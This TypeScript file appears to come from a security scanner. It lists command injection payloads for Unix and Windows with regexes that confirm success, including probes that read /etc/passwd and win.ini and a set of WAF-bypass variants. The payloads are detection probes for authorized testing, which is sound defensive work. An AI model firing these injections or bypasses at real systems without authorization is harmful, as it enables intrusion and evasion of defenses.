export interface CommandInjectionPayload {
  payload: string;
  patterns: RegExp[];
  os: "unix" | "windows" | "both";
}

const MARKER = "ftcmdi91x7";

// — 1. Echo marker (Unix) —
const ECHO_MARKER_UNIX: CommandInjectionPayload[] = [
  { payload: `; echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `| echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `&& echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `|| echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `\`echo ${MARKER}\``, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `$(echo ${MARKER})`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `%0aecho ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `%0d%0aecho ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
];

// — 2. Echo marker (Windows) —
const ECHO_MARKER_WINDOWS: CommandInjectionPayload[] = [
  { payload: `& echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  { payload: `&& echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  { payload: `|| echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  { payload: `| echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
];

// — 3. id command (Unix) —
const ID_PATTERNS = [/uid=\d+\(\w+\)\s+gid=\d+/, /uid=\d+.*gid=\d+/];
const ID_UNIX: CommandInjectionPayload[] = [
  { payload: "; id", patterns: ID_PATTERNS, os: "unix" },
  { payload: "| id", patterns: ID_PATTERNS, os: "unix" },
  { payload: "&& id", patterns: ID_PATTERNS, os: "unix" },
  { payload: "|| id", patterns: ID_PATTERNS, os: "unix" },
  { payload: "`id`", patterns: ID_PATTERNS, os: "unix" },
  { payload: "$(id)", patterns: ID_PATTERNS, os: "unix" },
  { payload: "%0aid", patterns: ID_PATTERNS, os: "unix" },
];

// — 4. /etc/passwd (Unix) —
const PASSWD_PATTERNS = [/root:.*:0:0:/, /[\w-]+:x:\d+:\d+:/];
const PASSWD_UNIX: CommandInjectionPayload[] = [
  { payload: "; cat /etc/passwd", patterns: PASSWD_PATTERNS, os: "unix" },
  { payload: "| cat /etc/passwd", patterns: PASSWD_PATTERNS, os: "unix" },
  { payload: "&& cat /etc/passwd", patterns: PASSWD_PATTERNS, os: "unix" },
  { payload: "$(cat /etc/passwd)", patterns: PASSWD_PATTERNS, os: "unix" },
  { payload: "`cat /etc/passwd`", patterns: PASSWD_PATTERNS, os: "unix" },
];

// — 5. uname -a (Unix) —
const UNAME_PATTERNS = [/Linux\s+\S+\s+\d+\.\d+\.\d+/, /Darwin\s+\S+\s+\d+\.\d+\.\d+/];
const UNAME_UNIX: CommandInjectionPayload[] = [
  { payload: "; uname -a", patterns: UNAME_PATTERNS, os: "unix" },
  { payload: "| uname -a", patterns: UNAME_PATTERNS, os: "unix" },
  { payload: "$(uname -a)", patterns: UNAME_PATTERNS, os: "unix" },
];

// — 6. ls / (Unix) —
const LS_PATTERNS = [/(?:bin|etc|usr|var|tmp|home)[\s\n].*?(?:bin|etc|usr|var|tmp|home)/s];
const LS_UNIX: CommandInjectionPayload[] = [
  { payload: "; ls /", patterns: LS_PATTERNS, os: "unix" },
  { payload: "| ls /", patterns: LS_PATTERNS, os: "unix" },
  { payload: "$(ls /)", patterns: LS_PATTERNS, os: "unix" },
];

// — 7. whoami (Windows) —
const WHOAMI_WIN_PATTERNS = [/[a-z0-9-]+\\[a-z0-9_-]+/i, /nt authority\\/i];
const WHOAMI_WINDOWS: CommandInjectionPayload[] = [
  { payload: "& whoami", patterns: WHOAMI_WIN_PATTERNS, os: "windows" },
  { payload: "&& whoami", patterns: WHOAMI_WIN_PATTERNS, os: "windows" },
  { payload: "| whoami", patterns: WHOAMI_WIN_PATTERNS, os: "windows" },
  { payload: "|| whoami", patterns: WHOAMI_WIN_PATTERNS, os: "windows" },
];

// — 8. dir (Windows) —
const DIR_PATTERNS = [/Volume in drive/i, /<DIR>/i, /Volume Serial Number/i];
const DIR_WINDOWS: CommandInjectionPayload[] = [
  { payload: "& dir C:\\", patterns: DIR_PATTERNS, os: "windows" },
  { payload: "&& dir C:\\", patterns: DIR_PATTERNS, os: "windows" },
  { payload: "| dir C:\\", patterns: DIR_PATTERNS, os: "windows" },
];

// — 9. win.ini (Windows) —
const WININI_PATTERNS = [/\[fonts\]/i, /\[extensions\]/i, /\[mci extensions\]/i];
const WININI_WINDOWS: CommandInjectionPayload[] = [
  { payload: "& type C:\\windows\\win.ini", patterns: WININI_PATTERNS, os: "windows" },
  { payload: "&& type C:\\windows\\win.ini", patterns: WININI_PATTERNS, os: "windows" },
  { payload: "| type C:\\windows\\win.ini", patterns: WININI_PATTERNS, os: "windows" },
];

// — 10. WAF bypass (Unix) —
const WAF_BYPASS_UNIX: CommandInjectionPayload[] = [
  // IFS separator
  { payload: `;echo${"\x20"}${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: ";{echo,ftcmdi91x7}", patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `;echo$IFS${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  // Quote insertion
  { payload: `;e'c'h'o' ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  { payload: `;e"c"h"o" ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  // Backslash insertion
  { payload: `;e\\cho ${MARKER}`, patterns: [new RegExp(MARKER)], os: "unix" },
  // Wildcard cat /etc/passwd
  { payload: ";cat /e?c/p?ss?d", patterns: PASSWD_PATTERNS, os: "unix" },
  { payload: ";cat /e*/pas*", patterns: PASSWD_PATTERNS, os: "unix" },
  // Base64 decode echo
  { payload: `;echo ZnRjbWRpOTF4Nw==|base64 -d`, patterns: [new RegExp(MARKER)], os: "unix" },
  // $() with IFS
  { payload: `$(echo$IFS${MARKER})`, patterns: [new RegExp(MARKER)], os: "unix" },
  // Newline via $'\n'
  { payload: `$'\\necho ${MARKER}'`, patterns: [new RegExp(MARKER)], os: "unix" },
];

// — 11. WAF bypass (Windows) —
const WAF_BYPASS_WINDOWS: CommandInjectionPayload[] = [
  // Caret insertion
  { payload: `& e^c^h^o ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  { payload: `& w^h^o^a^m^i`, patterns: WHOAMI_WIN_PATTERNS, os: "windows" },
  // %COMSPEC% invocation
  { payload: `& %COMSPEC% /c echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  // Double-quote bypass
  { payload: `& echo" "${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
  // Environment variable substring
  { payload: `& %COMSPEC:~0,3% /c echo ${MARKER}`, patterns: [new RegExp(MARKER)], os: "windows" },
];

export const COMMAND_INJECTION_PAYLOADS: CommandInjectionPayload[] = [
  ...ECHO_MARKER_UNIX,
  ...ECHO_MARKER_WINDOWS,
  ...ID_UNIX,
  ...PASSWD_UNIX,
  ...UNAME_UNIX,
  ...LS_UNIX,
  ...WHOAMI_WINDOWS,
  ...DIR_WINDOWS,
  ...WININI_WINDOWS,
  ...WAF_BYPASS_UNIX,
  ...WAF_BYPASS_WINDOWS,
];

export const COMMAND_INJECTION_PAYLOAD_STRINGS: string[] = COMMAND_INJECTION_PAYLOADS.map(
  (p) => p.payload,
);
